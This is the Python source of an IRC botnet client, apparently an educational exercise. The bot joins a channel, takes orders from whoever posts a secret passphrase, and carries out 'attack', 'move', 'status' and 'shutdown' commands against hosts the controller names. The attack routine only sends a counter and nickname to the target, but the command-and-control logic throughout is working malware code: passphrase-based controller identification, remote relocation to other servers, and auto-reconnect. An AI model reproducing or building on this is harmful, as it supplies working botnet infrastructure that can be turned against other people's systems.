"""
a bot client for a botnet.
"""

import argparse
import sys
import socket
import time
import random


# need to modify timeout to work with localhost and IPs with no actual
class Bot_Client:
    def __init__(self, host, port, channel, secret_phrase):
        self.host = host
        self.port = port
        self.channel = "#" + channel
        self.secret_phrase = secret_phrase
        self.bot_counter = 1
        self.bot_nick = "robotnik" + str(self.bot_counter)
        self.irc_socket = None
        self.controller = None
        self.controller_nick = None
        self.attack_counter = 0
        self.identifier = "Have you ever danced with the devil in the pale moonlight?"

    def start_client(self):
        connected, self.irc_socket = self.__attempt_connection(5)
        if not connected:
            sys.exit()
            
        while connected:
            try:
                text = self.get_text()
                self.log(text)
            except socket.error:
                self.log("Error: Connection to IRC server has been lost")
                self.__reconnect(5)
                continue

            # validate message (check if controller *command*)
            if not self.check_msg(text):
                continue
            input_list = text.split(' :')
            command = input_list[1].strip()

            try:
                self.execute_command(command)
            except socket.error:
                self.log("Error: Connection to IRC server has been lost")
                self.__reconnect(5)
                continue

    # attempts connection with an input timeout in seconds
    def __attempt_connection(self, timeout):
        connected = False
        timeout_start = time.time()
        while not connected and (time.time() < timeout_start + timeout):
            connected, conn_socket = self.__connect(timeout)
        if not connected:
            self.log("Error: Connection to Host: " + self.host + \
                     " on Port: " + str(self.port) + " failed.")
        return connected, conn_socket

    def __connect(self, timeout):
        conn_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn_socket.settimeout(timeout)
        try:
            conn_socket.connect((self.host, self.port))  # connect to server
        except socket.error:
            return False, None
        conn_socket.settimeout(None)
        conn_socket.send(("USER "+ "test" +" "+ self.bot_nick +" "+ self.bot_nick + \
        " :\n").encode()) # user authentication
        self.__establish_nick(conn_socket)
        conn_socket.send(("JOIN "+ self.channel +"\n").encode()) # join the channel
        return True, conn_socket

    # keeps sending nick messages until a valid nick is found
    def __establish_nick(self, conn_socket):
        valid_nick = False
        while not valid_nick:
            conn_socket.send(("NICK "+ self.bot_nick+"\n").encode()) # sets nick
            response = conn_socket.recv(2040).decode()
            if "433" in response:
                self.bot_counter += random.randint(1,100)
                self.bot_nick = "robotnik" + str(self.bot_counter)
            elif "001" in response:
                valid_nick = True

    # attempt reconnection with timeout
    def __reconnect(self, timeout):
        self.log("Attempting to reconnect...")
        connected, conn_socket = self.__attempt_connection(timeout)
        if connected:
            self.irc_socket = conn_socket
            self.log("Reconnection successful.\nContinuing...")
        else:
            sys.exit()
        return connected

    # Function to check for the secret passphrase
    def check_msg(self, text):
        if (not "PRIVMSG" in text) or (not self.channel in text):
            return False

        # get the sender's ID
        sender = text.split(':')[1].split(' ')[0]
        # get the message sent by the sender
        message = text.split(' :')[1].strip()
        
        # if no controller is defined
        if self.controller is None:
            # if the message is the secret phrase, assign the controller
            if self.secret_phrase == message:
                self.controller = sender
                self.controller_nick, _ = sender.split('!')
                self.log("Controller Identified: " + self.controller)
                return False # return False b/c not a command
            else:
                return False
        # if the message is from the current controller
        elif self.controller == sender:
            return True
        # if the message is not from the current controller
        else:
            return False

    # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
    def get_text(self):
        text = self.recv_msg()#.strip() #receive the text
        if text.find('PING') != -1:
            self.send_msg('PONG ' + text.split()[1] + '\r\n')
        return text

    # function to receive and execute the command sent by the controller
    def execute_command(self, command):
        command = command.split() # split command into list
        if len(command) <= 0:
            return
        if command[0] == "attack":
            if len(command) != 3:
                self.log("Error: Attack Failed due to incorrect number of arguments.")
                self.send_to_user(self.controller_nick, "Attack Failed, " + \
                                  "Incorrect number of arguments")
                return
            self.__attack(command[1], command[2])
        elif command[0] == "move":
            if len(command) != 4:
                self.log("Error: Move Failed due to incorrect number of arguments.")
                self.send_to_user(self.controller_nick, "Move Failed, " + \
                                  "Incorrect number of arguments")
                return
            self.__move(command[1], command[2], command[3])
        elif command[0] == "status":
            self.send_status()
        elif command[0] == "shutdown":
            self.__shutdown()

    # modify so that the bot doesn't close connection until it can initiate a connection with 2nd IRC
    # moves the bot to the specified host
    def __move(self, host, port, channel):
        if not check_port(port):
            self.log("Error: Move Failed, Port: " + str(port) + " is not valid.")
            self.send_to_user(self.controller_nick, "Move Failed, Invalid Port")
            return
        port = int(port)
        # store current connection info
        curr_port = self.port
        curr_host = self.host
        curr_channel = self.channel

        self.port = port
        self.host = host
        self.channel = "#" + channel
        # attempt connection to new IRC server (timeout close to 0)
        connected, conn_socket = self.__attempt_connection(1)
        if not connected:
            self.log("Error: Move to Host: " + host + \
                     " on Port: " + str(port) + " failed.")
            self.send_to_user(self.controller_nick, "Move Failed, Connection Error")
            # reassign original connection info upon failure
            self.port = curr_port
            self.host = curr_host
            self.channel = curr_channel
        else:
            # send success message close old socket, reassign to new socket
            self.log("Move Successful")
            self.send_to_user(self.controller_nick, "Move Successful")
            time.sleep(1) # sleep for a short time so the confirmation of a move goes through
            self.irc_socket.close()
            self.irc_socket = conn_socket
            # delete current controller
            self.controller = None
            self.controller_nick = None
        return

    # attempts to send the attack message to the target
    def __attack(self, host, port):
        self.attack_counter += 1
        if not check_port(port):
            self.log("Error: Attack Failed, Port: " + str(port) + " is not valid.")
            self.send_to_user(self.controller_nick, "Attack Failed, Invalid Port")
            return
        port = int(port)
        attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        connected = True
        attack_socket.settimeout(1)
        try:
            attack_socket.connect((host, port)) # connect to victim
        except socket.error:
            connected = False
        attack_socket.settimeout(None)

        if not connected:
            self.log("Error: Attack on Host: " + host + \
                     " on Port: " + str(port) + " failed.")
            self.send_to_user(self.controller_nick,
                              "Attack Failed, Connection Error")
        else:
            # send attack message and report success
            attack_socket.send((str(self.attack_counter) + \
                               " " + self.bot_nick).encode())
            self.log("Attack Successful")
            self.send_to_user(self.controller_nick, "Attack Successful")
            time.sleep(0.5) # sleep for a short time so the confirmation of an attack goes through
        attack_socket.close()

    # sends the bot status to the controller
    def send_status(self):
        self.send_to_user(self.controller_nick, self.bot_nick)
        self.log("Status sent to Controller")

    # Closes connection and terminates bot
    def __shutdown(self):
        self.send_to_user(self.controller_nick, "Shutting Down...")
        self.log("Shutting Down...")
        self.irc_socket.close()
        sys.exit()

    # function for logging messages
    def log(self, message):
        print(message.strip("\n") + "\n")

    # functions to send/recv raw messages from IRC server
    def send_msg(self, message):
        self.irc_socket.send(message.encode())

    def recv_msg(self):
        data = self.irc_socket.recv(4096).decode()  #receive the text
        if data == "":
            raise socket.error()
        return data

    # functions to send/recv messages to channel
    def send_to_channel(self, message):
        self.send_msg("PRIVMSG " + self.channel + " :" + message + "\n")

    def send_to_user(self, nick, message):
        self.send_msg("PRIVMSG " + nick + " :" + self.identifier + message + "\n")

# function to check if port is valid
def check_port(port):
    try:
        port = int(port)
    except ValueError:
        return False
    if port >= 0 and port <= 65535:
        return True
    else:
        return False

# argparse function to handle user input
# Reference: https://docs.python.org/3.6/howto/argparse.html
# define a string to hold the usage error msg
def parse_arguments():
    usage_string = ("bot.py <host> <port> <channel> <secret-phrase>")
    parser = argparse.ArgumentParser(usage=usage_string)

    parser.add_argument("host",
                        help="Specifies the address of the server",
                        type=str)
    parser.add_argument("port",
                        help="Specifies the port on which the server is listening."
                        " Port in integer range 0-65535",
                        type=int)
    parser.add_argument("channel",
                        help="IRC channel to join",
                        type=str)
    parser.add_argument("secret_phrase",
                        help="A secret text required to connect",
                        type=str)
    args = parser.parse_args()

    # check that port is in a valid range
    if not check_port(args.port):
        parser.exit("usage: " + usage_string)

    return args


def main():
    args = parse_arguments()
    # launch the client
    bot_client = Bot_Client(args.host, args.port, args.channel,
                            args.secret_phrase)
    bot_client.start_client()

if __name__ == '__main__':
    main()
